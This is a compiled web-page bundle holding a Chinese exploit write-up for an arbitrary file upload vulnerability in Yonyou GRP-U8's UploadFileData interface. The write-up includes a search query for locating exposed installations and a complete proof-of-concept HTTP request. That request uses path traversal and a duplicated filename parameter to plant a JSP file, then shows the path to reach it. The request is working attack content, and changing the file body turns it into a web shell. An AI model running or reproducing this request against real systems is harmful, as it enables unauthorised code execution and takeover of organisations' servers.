import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as i,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>用友 GRP-U8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;用友-GRP-U8&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241423596.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=debugg.jsp&amp;filename=1.jpg HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
Content-Type: multipart/form-data
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name=&quot;myFile&quot;;filename=&quot;test.jpg&quot;

&lt;% out.println(&quot;123&quot;);%&gt;
------WebKitFormBoundary92pUawKc--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241423854.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问写入的文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/R9iPortal/debugg.jsp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241423890.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),l=[d];function s(r,p){return e(),i("div",null,l)}const o=a(t,[["render",s],["__file","用友 GRP-U8 UploadFileData 任意文件上传漏洞.html.vue"]]);export{o as default};
